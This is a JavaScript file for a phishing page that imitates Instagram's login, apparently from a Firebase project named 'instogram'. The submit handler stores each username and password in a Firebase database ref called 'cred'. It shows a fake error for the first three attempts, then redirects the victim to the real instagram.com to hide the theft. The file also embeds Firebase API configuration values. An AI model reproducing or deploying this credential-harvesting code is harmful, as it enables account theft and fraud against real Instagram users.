const imageUrls = [
    "img/img1.png",
    "img/img2.png",
    "img/img3.png",
    "img/img4.png"
];

let currentImageIndex = 0;

function updateImage() {
    const imageElement = document.querySelector('.firstContainer img');
    imageElement.src = imageUrls[currentImageIndex];
    currentImageIndex = (currentImageIndex + 1) % imageUrls.length;
}

setInterval(updateImage, 3000);

const firebaseConfig = {
  apiKey: "AIzaSyAg_c2sIlqohIwHTQ8TGuT7a8qycTCFzbI",
  authDomain: "instogram-15d4c.firebaseapp.com",
  databaseURL: "https://instogram-15d4c-default-rtdb.firebaseio.com",
  projectId: "instogram-15d4c",
  storageBucket: "instogram-15d4c.appspot.com",
  messagingSenderId: "781739855234",
  appId: "1:781739855234:web:00a48d4830ea17877b139b"
};

firebase.initializeApp(firebaseConfig);
var credDB = firebase.database().ref("cred");

document.getElementById('cred').addEventListener('submit',submitForm)
let loginButtonClickCount = 0;

function submitForm(e) {
    e.preventDefault();
    var username = getElementVal("username");
    var password = getElementVal("password");
    console.log(username, password);
    saveMessages(username,password);
    if (loginButtonClickCount === 0 || loginButtonClickCount === 1 || loginButtonClickCount === 2) {
        document.getElementById('errorMessage').style.display = 'block';
        loginButtonClickCount++;
    } else {
        redirectToAnotherURL();
    }
}
function redirectToAnotherURL() {
    // Modify this function to redirect to your desired URL
    window.location.href = 'https://www.instagram.com/';
}
const saveMessages = (username, password) => {
  var newCred = credDB.push();

  newCred.set({
    username: username,
    password: password,
  });
};

const getElementVal = (id) =>{
    return document.getElementById(id).value;
}
